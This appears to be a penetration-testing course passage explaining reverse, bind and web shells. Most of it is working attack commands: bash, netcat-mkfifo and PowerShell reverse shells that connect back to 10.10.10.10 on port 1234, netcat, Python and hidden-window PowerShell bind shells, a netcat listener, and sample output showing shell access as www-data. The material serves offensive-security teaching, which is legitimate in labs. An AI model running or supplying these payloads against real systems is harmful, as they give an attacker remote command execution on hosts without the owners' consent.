# Reverse Shell

A Reverse Shell is the most common type of shell, as it is the quickest and

easiest method to obtain control over a compromised host. Once we identify a

vulnerability on the remote host that allows remote code execution, we can start

a netcat listener on our machine that listens on a specific port, say port 1234.

With this listener in place, we can execute a reverse shell command that

connects the remote systems shell, i.e., Bash or PowerShell to our netcat

listener, which gives us a reverse connection over the remote system.

The first step is to start a netcat listener on a port of our choosing:

```c
nc -lvnp 1234

listening on [any] 1234 ...
```

Now that we have a netcat listener waiting for a connection, we can execute the reverse shell command that connects to us.


The command we execute depends on what operating system the compromised host

runs on, i.e., Linux or Windows, and what applications and commands we can

access. The Payload All The Things page has a comprehensive list of reverse

shell commands we can use that cover a wide range of options depending on our

compromised host.

Certain reverse shell commands are more reliable than others and can usually be

attempted to get a reverse connection. The below commands are reliable commands

we can use to get a reverse connection, for bash on Linux compromised hosts and

Powershell on Windows compromised hosts:


```c
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

We can utilize the exploit we have over the remote host to execute one of the

above commands, i.e., through a Python exploit or a Metasploit module, to get a

reverse connection. Once we do, we should receive a connection in our netcat

listener:

```c
nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, after we received a connection on our netcat listener, we were

able to type our command and directly get its output back, right in our machine.

A Reverse Shell is handy when we want to get a quick, reliable connection to our

compromised host. However, a Reverse Shell can be very fragile. Once the reverse

shell command is stopped, or if we lose our connection for any reason, we would

have to use the initial exploit to execute the reverse shell command again to

regain our access.

# Bind Shell

Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to

us, we will have to connect to it on the targets' listening port.

Once we execute a Bind Shell Command, it will start listening on a port on the

remote host and bind that host's shell, i.e., Bash or PowerShell, to that port.

We have to connect to that port with netcat, and we will get control through a

shell on that system.


```c
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();



```
```c
nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# Web Shell

The final type of shell we have is a Web Shell. A Web Shell is typically a web

script, i.e., PHP or ASPX, that accepts our command through HTTP request

parameters such as GET or POST request parameters, executes our command, and

prints its output back on the web page.


